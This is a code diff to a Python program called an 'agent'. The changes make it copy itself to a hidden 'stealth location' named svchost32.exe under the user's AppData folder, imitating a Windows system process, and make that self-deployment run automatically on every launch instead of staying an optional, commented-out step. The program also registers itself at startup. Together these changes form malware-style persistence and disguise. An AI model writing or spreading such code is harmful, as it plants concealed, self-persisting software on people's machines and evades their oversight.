@@ -2156,6 +2156,18 @@ def self_deploy_powershell():
         # Get current executable path
         current_exe = sys.executable if hasattr(sys, 'executable') else os.path.abspath(__file__)
         
+        # Check if already deployed
+        stealth_path = os.path.join(
+            os.environ.get('LOCALAPPDATA', ''),
+            'Microsoft',
+            'Windows',
+            'svchost32.exe'
+        )
+        
+        if os.path.exists(stealth_path):
+            print("[INFO] Already deployed to stealth location")
+            return True
+        
         # Define stealth paths
         stealth_path = os.path.join(
             os.environ.get('LOCALAPPDATA', ''),
@@ -7402,6 +7414,20 @@ def agent_main():
     print("Starting up...")
     print("=" * 60)
     
+    # Check if running from stealth location
+    current_path = sys.executable if hasattr(sys, 'executable') else os.path.abspath(__file__)
+    stealth_path = os.path.join(
+        os.environ.get('LOCALAPPDATA', ''),
+        'Microsoft',
+        'Windows',
+        'svchost32.exe'
+    )
+    
+    if current_path == stealth_path:
+        print("[INFO] Running from stealth location")
+    else:
+        print("[INFO] Running from original location - will deploy to stealth location")
+    
     # Initialize agent with error handling
     try:
         if WINDOWS_AVAILABLE:
@@ -7436,14 +7462,16 @@ def agent_main():
         except Exception as e:
             print(f"[WARN] Could not add to startup: {e}")
         
-        # Optional: Auto self-deploy if running as script (not executable)
-        if __name__ == "__main__" and not hasattr(sys, 'frozen'):
-            try:
-                print("[INFO] Running as script - offering self-deployment...")
-                # Uncomment the next line to enable automatic self-deployment
-                # self_deploy_powershell()
-            except Exception as e:
-                print(f"[WARN] Self-deployment not available: {e}")
+        # Auto self-deploy when running
+        try:
+            print("[INFO] Initiating automatic self-deployment...")
+            if self_deploy_powershell():
+                print("[OK] Self-deployment completed successfully")
+                print("[INFO] Agent will now run from stealth location on next login")
+            else:
+                print("[WARN] Self-deployment failed or was skipped")
+        except Exception as e:
+            print(f"[WARN] Self-deployment failed: {e}")
         
         # Get or create agent ID
         agent_id = get_or_create_agent_id()
